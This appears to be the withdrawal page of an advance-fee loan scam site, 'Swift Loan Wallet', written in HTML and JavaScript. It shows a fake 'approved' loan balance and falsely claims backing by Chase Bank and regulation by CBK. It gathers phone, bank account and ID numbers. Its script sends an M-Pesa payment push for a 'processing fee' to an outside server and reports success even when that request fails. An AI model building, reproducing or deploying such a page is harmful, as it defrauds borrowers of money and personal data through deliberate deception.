<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Withdrawal - Swift Loan Wallet</title>
    <link rel="icon" type="image/png" href="swiftloan-logo.png">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-orange: #FF6B00;
            --primary-blue: #001F5C;
            --light-gray: #F5F5F5;
            --text-dark: #333;
            --white: #FFFFFF;
            --success-green: #28a745;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: var(--text-dark);
            background: var(--light-gray);
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--primary-blue) 0%, #003580 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .loading-screen.hidden {
            display: none;
        }

        .spinner-large {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: var(--white);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            color: var(--white);
            font-size: 1.2rem;
        }

        /* Main Container */
        .main-container {
            max-width: 900px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .page-title {
            color: var(--primary-blue);
            font-size: 2.2rem;
            text-align: center;
            margin-bottom: 1rem;
        }

        .page-subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.8;
        }

        /* Details Box */
        .details-box {
            background: var(--white);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            margin-bottom: 2rem;
        }

        .details-box h3 {
            color: var(--primary-blue);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-badge {
            background: var(--success-green);
            color: var(--white);
            padding: 0.3rem 0.8rem;
            border-radius: 20px;
            font-size: 0.85rem;
        }

        .details-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
        }

        .detail-item {
            padding: 0.8rem;
            background: var(--light-gray);
            border-radius: 5px;
        }

        .detail-label {
            font-size: 0.85rem;
            color: #666;
            margin-bottom: 0.3rem;
        }

        .detail-value {
            font-weight: 600;
            font-size: 1.1rem;
            color: var(--text-dark);
        }

        .balance-display {
            background: linear-gradient(135deg, var(--primary-orange) 0%, #ff8534 100%);
            color: var(--white);
            padding: 2rem;
            border-radius: 10px;
            text-align: center;
            margin: 1.5rem 0;
        }

        .balance-label {
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
        }

        .balance-amount {
            font-size: 2.5rem;
            font-weight: bold;
        }

        /* Buttons */
        .btn {
            padding: 1rem 2rem;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            display: inline-block;
            text-align: center;
        }

        .btn-primary {
            background: var(--primary-orange);
            color: var(--white);
            width: 100%;
        }

        .btn-primary:hover {
            background: #e65f00;
            transform: translateY(-2px);
        }

        /* Important Info */
        .info-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 1.5rem;
            border-radius: 5px;
            margin: 2rem 0;
        }

        .info-box h4 {
            color: var(--primary-blue);
            margin-bottom: 1rem;
        }

        .info-box ul {
            padding-left: 1.5rem;
            line-height: 2;
        }

        /* Timeline */
        .timeline {
            background: var(--white);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 3px 15px rgba(0,0,0,0.1);
            margin-bottom: 2rem;
        }

        .timeline h3 {
            color: var(--primary-blue);
            margin-bottom: 1.5rem;
        }

        .timeline-item {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
            position: relative;
            padding-left: 2rem;
        }

        .timeline-item::before {
            content: '';
            position: absolute;
            left: 8px;
            top: 30px;
            width: 2px;
            height: 100%;
            background: #ddd;
        }

        .timeline-item:last-child::before {
            display: none;
        }

        .timeline-icon {
            width: 20px;
            height: 20px;
            background: var(--success-green);
            border-radius: 50%;
            position: absolute;
            left: 0;
        }

        .timeline-icon.pending {
            background: #ffc107;
        }

        .timeline-content h4 {
            color: var(--primary-blue);
            margin-bottom: 0.3rem;
        }

        .timeline-time {
            font-size: 0.85rem;
            color: #666;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 2000;
            overflow-y: auto;
            padding: 2rem 0;
        }

        .modal.active {
            display: block;
        }

        .modal-content {
            background: var(--white);
            padding: 2.5rem;
            border-radius: 10px;
            max-width: 600px;
            width: 90%;
            margin: 2rem auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .modal-title {
            color: var(--primary-blue);
            font-size: 1.5rem;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 2rem;
            cursor: pointer;
            color: #666;
        }

        /* Withdrawal Methods */
        .withdrawal-options {
            margin: 1.5rem 0;
        }

        .withdrawal-option {
            background: var(--light-gray);
            padding: 1.5rem;
            border-radius: 8px;
            margin-bottom: 1rem;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .withdrawal-option:hover {
            background: #e0e0e0;
            transform: translateX(5px);
        }

        .withdrawal-option h4 {
            color: var(--primary-blue);
            margin-bottom: 0.3rem;
        }

        .withdrawal-option p {
            font-size: 0.9rem;
            color: #666;
        }

        .withdrawal-arrow {
            font-size: 1.5rem;
            color: var(--primary-orange);
        }

        /* Form */
        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-dark);
        }

        input[type="text"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
            transition: 0.3s;
        }

        input:focus,
        select:focus {
            outline: none;
            border-color: var(--primary-orange);
        }

        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 0.3rem;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        /* Success Alert */
        .success-alert {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
            line-height: 1.8;
        }

        .success-alert h4 {
            margin-bottom: 0.5rem;
        }

        /* Blue Processing Modal */
        .blue-modal {
            background: linear-gradient(135deg, var(--primary-blue) 0%, #003580 100%);
            color: var(--white);
            padding: 3rem 2rem;
            max-width: 800px;
        }

        .blue-modal h2 {
            margin-bottom: 1rem;
        }

        .blue-modal p {
            line-height: 1.8;
            margin-bottom: 1rem;
        }

        /* Chat Widget */
        .chat-widget {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            background: #0084ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            z-index: 1000;
        }

        .chat-widget:hover {
            transform: scale(1.1);
        }

        /* Footer */
        footer {
            background: var(--primary-blue);
            color: var(--white);
            padding: 2rem 5% 1rem;
            margin-top: 3rem;
            text-align: center;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .page-title {
                font-size: 1.8rem;
            }

            .balance-amount {
                font-size: 2rem;
            }

            .modal-content {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="spinner-large"></div>
        <div class="loading-text">Loading your loan wallet...</div>
    </div>

    <!-- Main Container -->
    <div class="main-container" id="mainContent" style="display: none;">
        <h1 class="page-title">Swift Loan Wallet</h1>
        <p class="page-subtitle">
            Withdraw Your Loan Funds Instantly<br>
            Your loan has been approved and is ready for instant withdrawal to your preferred account. Contact our support team through the blue chat message button at the bottom right, we are always online 24/7. Note that repayment will be done at the repayment period, we have your details for follow up.
        </p>

        <!-- Customer Details -->
        <div class="details-box">
            <h3>
                Customer Details
                <span class="status-badge">APPROVED</span>
            </h3>
            <div class="details-grid" id="customerDetails">
                <!-- Populated by JavaScript -->
            </div>
        </div>

        <!-- Loan Details -->
        <div class="details-box">
            <h3>Loan Details</h3>
            <div class="details-grid" id="loanDetails">
                <!-- Populated by JavaScript -->
            </div>
            
            <div class="balance-display">
                <div class="balance-label">Available Balance</div>
                <div class="balance-amount">KES <span id="availableBalance">0</span></div>
                <p style="font-size: 0.9rem; margin-top: 0.5rem;">Actual amount approved; withdrawable</p>
                <p style="font-size: 0.85rem;">Secured by Chase Bank LMTD • Approved amount</p>
            </div>
        </div>

        <!-- Withdraw Section -->
        <div class="details-box">
            <h3>Withdraw My Loan</h3>
            <p style="margin-bottom: 1.5rem; color: #666;">Choose your preferred withdrawal method and complete the process</p>
            
            <div style="background: var(--light-gray); padding: 1rem; border-radius: 5px; margin-bottom: 1.5rem;">
                <strong>Verified Withdrawal Amount:</strong> KES <span id="verifiedAmount">0</span>
            </div>

            <button class="btn btn-primary" onclick="openWithdrawalModal()">Choose Withdrawal Method</button>
        </div>

        <!-- Important Information -->
        <div class="info-box">
            <h4>Important Information:</h4>
            <ul>
                <li>Choose from M-Pesa, Airtel Money, or Bank Transfer</li>
                <li>All withdrawal methods are secure and encrypted</li>
                <li>Funds will be credited to your account. Check updates in the system generated receipt</li>
                <li>Keep your phone nearby for confirmation process</li>
                <li>You will receive SMS confirmation once completed</li>
                <li>Verify your details carefully before proceeding</li>
                <li>NOTE that all your loan funds are securely held by Chase Bank regulated by CBK. Fee securely releases the funds to your M-Pesa, Airtel Money and Bank accounts</li>
                <li>If you encounter any problem don't hesitate to contact our support team through the blue chat widget at the bottom right side. We are always online</li>
                <li>The live loan receipt is possessed by our loan systems and shows the current status of the applicant loan. If you get any problem, download the PDF receipt and send to live support for assistance</li>
            </ul>
        </div>

        <!-- Transaction Timeline -->
        <div class="timeline">
            <h3>Transaction Timeline</h3>
            <div class="timeline-item">
                <div class="timeline-icon"></div>
                <div class="timeline-content">
                    <h4>Loan Application Submitted</h4>
                    <p>Your loan request was successfully submitted</p>
                    <p class="timeline-time">2 min ago</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"></div>
                <div class="timeline-content">
                    <h4>Credit Check Completed</h4>
                    <p>Eligibility verification completed successfully</p>
                    <p class="timeline-time">1 min ago</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon"></div>
                <div class="timeline-content">
                    <h4>Loan Approved</h4>
                    <p>Your loan has been approved and is ready for withdrawal</p>
                    <p class="timeline-time">Just now</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-icon pending"></div>
                <div class="timeline-content">
                    <h4>Funds Disbursement</h4>
                    <p>Waiting for your withdrawal confirmation by completing fee payment to release your available balance funds</p>
                    <p class="timeline-time">Pending</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdrawal Method Modal -->
    <div class="modal" id="withdrawalModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Choose Withdrawal Method</h3>
                <button class="close-modal" onclick="closeWithdrawalModal()">&times;</button>
            </div>

            <div class="withdrawal-options">
                <div class="withdrawal-option" onclick="selectMpesa()">
                    <div>
                        <h4>M-Pesa</h4>
                        <p>Instant mobile money transfer</p>
                        <p style="color: var(--primary-orange); font-weight: 600; margin-top: 0.3rem;">Most Popular • Withdrawal updates in receipt</p>
                    </div>
                    <div class="withdrawal-arrow">›</div>
                </div>

                <div class="withdrawal-option" onclick="selectAirtel()">
                    <div>
                        <h4>Airtel Money</h4>
                        <p>Mobile money transfer</p>
                        <p style="color: var(--primary-orange); font-weight: 600; margin-top: 0.3rem;">Fast • Withdrawal updates in receipt</p>
                    </div>
                    <div class="withdrawal-arrow">›</div>
                </div>

                <div class="withdrawal-option" onclick="selectBank()">
                    <div>
                        <h4>Bank Transfer</h4>
                        <p>Direct transfer to your bank account</p>
                        <p style="color: var(--primary-orange); font-weight: 600; margin-top: 0.3rem;">Secure • Withdrawal updates in receipt</p>
                    </div>
                    <div class="withdrawal-arrow">›</div>
                </div>
            </div>

            <p style="text-align: center; margin-top: 1.5rem; color: #666;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align: middle;">
                    <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1Z"/>
                </svg>
                Secure & Encrypted - All transactions are protected with bank-level security and 256-bit encryption
            </p>
        </div>
    </div>

    <!-- M-Pesa Details Modal -->
    <div class="modal" id="mpesaModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">M-Pesa Withdrawal Details</h3>
                <button class="close-modal" onclick="closeMpesaModal()">&times;</button>
            </div>

            <form id="mpesaForm">
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="tel" id="mpesaPhone" placeholder="254XXXXXXXXX" required>
                    <span class="error-message" id="mpesaPhoneError">Enter valid phone number starting with 254</span>
                </div>

                <div class="form-group">
                    <label>Account Holder Name</label>
                    <input type="text" id="mpesaName" placeholder="Enter full name" required>
                </div>

                <button type="button" class="btn btn-primary" onclick="initiateWithdrawal('mpesa')">
                    Withdraw KES <span id="mpesaAmount">0</span>
                </button>
            </form>
        </div>
    </div>

    <!-- Airtel Money Details Modal -->
    <div class="modal" id="airtelModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Airtel Money Withdrawal Details</h3>
                <button class="close-modal" onclick="closeAirtelModal()">&times;</button>
            </div>

            <form id="airtelForm">
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="tel" id="airtelPhone" placeholder="254XXXXXXXXX" required>
                    <span class="error-message" id="airtelPhoneError">Enter valid phone number starting with 254</span>
                </div>

                <div class="form-group">
                    <label>Account Holder Name</label>
                    <input type="text" id="airtelName" placeholder="Enter full name" required>
                </div>

                <button type="button" class="btn btn-primary" onclick="initiateWithdrawal('airtel')">
                    Withdraw KES <span id="airtelAmount">0</span>
                </button>
            </form>
        </div>
    </div>

    <!-- Bank Transfer Modal -->
    <div class="modal" id="bankModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Bank Transfer Details</h3>
                <button class="close-modal" onclick="closeBankModal()">&times;</button>
            </div>

            <form id="bankForm">
                <div class="form-group">
                    <label>Select Bank</label>
                    <select id="bankName" required>
                        <option value="">Choose your bank</option>
                        <option value="Equity Bank (247247)">Equity Bank (247247)</option>
                        <option value="KCB Bank (522522)">KCB Bank (522522)</option>
                        <option value="Cooperative Bank (400200)">Cooperative Bank (400200)</option>
                        <option value="NCBA Bank (654321)">NCBA Bank (654321)</option>
                        <option value="Absa Bank (303030)">Absa Bank (303030)</option>
                        <option value="Standard Chartered (329329)">Standard Chartered (329329)</option>
                        <option value="DTB (380380)">DTB (380380)</option>
                        <option value="I&M Bank (975975)">I&M Bank (975975)</option>
                        <option value="Stanbic Bank (225225)">Stanbic Bank (225225)</option>
                        <option value="Family Bank (222111)">Family Bank (222111)</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Account Number</label>
                    <input type="text" id="accountNumber" placeholder="Enter account number" required>
                </div>

                <div class="form-group">
                    <label>Account Holder Name</label>
                    <input type="text" id="accountHolderName" placeholder="Enter full name as per bank" required>
                </div>

                <div class="form-group">
                    <label>ID Number</label>
                    <input type="text" id="bankIdNumber" placeholder="Enter ID number" required>
                </div>

                <button type="button" class="btn btn-primary" onclick="initiateWithdrawal('bank')">
                    Withdraw KES <span id="bankAmount">0</span>
                </button>
            </form>
        </div>
    </div>

    <!-- Processing Modal (Blue) -->
    <div class="modal" id="processingModal">
        <div class="modal-content blue-modal">
            <h2>Swift Loan Wallet</h2>
            <p>Loan Transfer to wallet was Successful & Ready for Withdrawal. Powered by CHASEBANK and regulated by CBK</p>
            
            <div style="margin: 2rem 0;">
                <h3 style="margin-bottom: 1rem;">Processing Your Loan Withdrawal</h3>
                <p>Sending withdrawal request to release funds...</p>
                <p style="margin-top: 1rem;">Please check your phone for the payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong></p>
            </div>

            <div style="text-align: center; margin: 2rem 0;">
                <div class="spinner-large"></div>
            </div>

            <div style="background: rgba(255,255,255,0.1); padding: 1rem; border-radius: 5px; margin: 1rem 0;">
                <p style="font-size: 0.9rem;">Bank Grade Security • 256-bit Encryption • Licensed by CBK</p>
                <p style="font-size: 0.85rem; margin-top: 0.5rem;">Validating • Processing • Confirming</p>
            </div>

            <p style="font-size: 0.85rem; text-align: center;">Powered by CHASEBANK</p>
        </div>
    </div>

    <!-- Success Modal -->
    <div class="modal" id="successModal">
        <div class="modal-content">
            <h3 style="color: var(--success-green); margin-bottom: 1rem;">
                Withdrawal Initiated Successfully!
            </h3>
            
            <div class="success-alert" id="successMessage">
                <!-- Populated by JavaScript -->
            </div>

            <p style="text-align: center; font-weight: 600; color: var(--primary-orange); margin-top: 1rem;">
                Pending Fee Payment & Withdrawal Approval
            </p>
        </div>
    </div>

    <!-- Chat Widget -->
    <div class="chat-widget">
        <svg width="30" height="30" viewBox="0 0 24 24" fill="white">
            <path d="M12,3C6.5,3 2,6.58 2,11C2.05,13.15 3.06,15.17 4.75,16.5C4.75,17.1 4.33,18.67 2,21C4.37,20.89 6.64,20 8.47,18.5C9.61,18.83 10.81,19 12,19C17.5,19 22,15.42 22,11C22,6.58 17.5,3 12,3M12,17C7.58,17 4,14.31 4,11C4,7.69 7.58,5 12,5C16.42,5 20,7.69 20,11C20,14.31 16.42,17 12,17Z"/>
        </svg>
    </div>

    <!-- Footer -->
    <footer>
        <p>&copy; 2025 Swift Loan Wallet. All rights reserved.</p>
    </footer>

    <script>
        let loanData = {};
        let selectedMethod = '';

        // Check if user has loan data
        window.addEventListener('load', function() {
            const selectedOffer = localStorage.getItem('swiftloan_selected_offer');
            
            if (!selectedOffer) {
                // Show loading for a bit then redirect
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
                return;
            }

            loanData = JSON.parse(selectedOffer);
            loadLoanData();
            
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById('mainContent').style.display = 'block';
            }, 1500);
        });

        function loadLoanData() {
            const personalDetails = JSON.parse(localStorage.getItem('swiftloan_personal_details'));
            const loanId = localStorage.getItem('swiftloan_loan_id') || 'LN-10001';

            // Customer Details
            document.getElementById('customerDetails').innerHTML = `
                <div class="detail-item">
                    <div class="detail-label">Full Name</div>
                    <div class="detail-value">${personalDetails.fullName}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Phone Number</div>
                    <div class="detail-value">${personalDetails.phoneNumber}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Loan ID</div>
                    <div class="detail-value">${loanId}</div>
                </div>
            `;

            // Loan Details
            document.getElementById('loanDetails').innerHTML = `
                <div class="detail-item">
                    <div class="detail-label">Loan Amount</div>
                    <div class="detail-value">KES ${loanData.principal.toLocaleString()}</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Processing Fee</div>
                    <div class="detail-value">KES ${loanData.fee.toLocaleString()}</div>
                </div>
            `;

            // Update all balance displays
            const balance = loanData.amountReceived.toLocaleString();
            document.getElementById('availableBalance').textContent = balance;
            document.getElementById('verifiedAmount').textContent = balance;
            document.getElementById('mpesaAmount').textContent = balance;
            document.getElementById('airtelAmount').textContent = balance;
            document.getElementById('bankAmount').textContent = balance;
        }

        function openWithdrawalModal() {
            document.getElementById('withdrawalModal').classList.add('active');
        }

        function closeWithdrawalModal() {
            document.getElementById('withdrawalModal').classList.remove('active');
        }

        function selectMpesa() {
            closeWithdrawalModal();
            selectedMethod = 'mpesa';
            document.getElementById('mpesaModal').classList.add('active');
        }

        function selectAirtel() {
            closeWithdrawalModal();
            selectedMethod = 'airtel';
            document.getElementById('airtelModal').classList.add('active');
        }

        function selectBank() {
            closeWithdrawalModal();
            selectedMethod = 'bank';
            document.getElementById('bankModal').classList.add('active');
        }

        function closeMpesaModal() {
            document.getElementById('mpesaModal').classList.remove('active');
        }

        function closeAirtelModal() {
            document.getElementById('airtelModal').classList.remove('active');
        }

        function closeBankModal() {
            document.getElementById('bankModal').classList.remove('active');
        }

        function validatePhone(phone) {
            return /^254\d{9}$/.test(phone);
        }

        async function initiateWithdrawal(method) {
            let phoneNumber, accountName;

            if (method === 'mpesa') {
                phoneNumber = document.getElementById('mpesaPhone').value.trim();
                accountName = document.getElementById('mpesaName').value.trim();

                if (!validatePhone(phoneNumber)) {
                    document.getElementById('mpesaPhoneError').classList.add('show');
                    return;
                }
                if (!accountName) {
                    alert('Please enter account holder name');
                    return;
                }
                closeMpesaModal();
            } else if (method === 'airtel') {
                phoneNumber = document.getElementById('airtelPhone').value.trim();
                accountName = document.getElementById('airtelName').value.trim();

                if (!validatePhone(phoneNumber)) {
                    document.getElementById('airtelPhoneError').classList.add('show');
                    return;
                }
                if (!accountName) {
                    alert('Please enter account holder name');
                    return;
                }
                closeAirtelModal();
            } else if (method === 'bank') {
                const bankName = document.getElementById('bankName').value;
                const accountNumber = document.getElementById('accountNumber').value.trim();
                accountName = document.getElementById('accountHolderName').value.trim();
                const idNumber = document.getElementById('bankIdNumber').value.trim();

                if (!bankName || !accountNumber || !accountName || !idNumber) {
                    alert('Please fill all bank details');
                    return;
                }
                
                phoneNumber = JSON.parse(localStorage.getItem('swiftloan_personal_details')).phoneNumber;
                if (!phoneNumber.startsWith('254')) {
                    phoneNumber = '254' + phoneNumber.substring(1);
                }
                closeBankModal();
            }

            // Show processing modal
            document.getElementById('processingModal').classList.add('active');

            // Send STK push request
            try {
                const response = await fetch('https://swiftcapitalportal.onrender.com/stkpush', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phoneNumber,
                        amount: loanData.fee
                    })
                });

                const result = await response.json();
                
                // Close processing modal
                setTimeout(() => {
                    document.getElementById('processingModal').classList.remove('active');
                    
                    // Show success message
                    const successMsg = `
                        <h4>Withdrawal of KES ${loanData.amountReceived.toLocaleString()} Initiated Successfully!</h4>
                        <p>Your withdrawal request is initiated successfully! Check your phone (${phoneNumber}) for the M-Pesa payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal.</p>
                        <p>Your withdrawal to ${method.toUpperCase()} is <strong>PENDING SYSTEM APPROVAL</strong> after fee payment of KES ${loanData.fee.toLocaleString()} is confirmed.</p>
                    `;
                    
                    document.getElementById('successMessage').innerHTML = successMsg;
                    document.getElementById('successModal').classList.add('active');
                }, 3000);
            } catch (error) {
                document.getElementById('processingModal').classList.remove('active');
                
                // Still show success message (backend might be offline for demo)
                setTimeout(() => {
                    const successMsg = `
                        <h4>Withdrawal of KES ${loanData.amountReceived.toLocaleString()} Initiated Successfully!</h4>
                        <p>Your withdrawal request is initiated successfully! Check your phone (${phoneNumber}) for the M-Pesa payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal.</p>
                        <p>Your withdrawal to ${method.toUpperCase()} is <strong>PENDING SYSTEM APPROVAL</strong> after fee payment of KES ${loanData.fee.toLocaleString()} is confirmed.</p>
                    `;
                    
                    document.getElementById('successMessage').innerHTML = successMsg;
                    document.getElementById('successModal').classList.add('active');
                }, 3000);
            }
        }

        // Real-time validation
        document.getElementById('mpesaPhone')?.addEventListener('input', function() {
            if (validatePhone(this.value)) {
                document.getElementById('mpesaPhoneError').classList.remove('show');
            }
        });

        document.getElementById('airtelPhone')?.addEventListener('input', function() {
            if (validatePhone(this.value)) {
                document.getElementById('airtelPhoneError').classList.remove('show');
            }
        });
    </script>
</body>
</html>
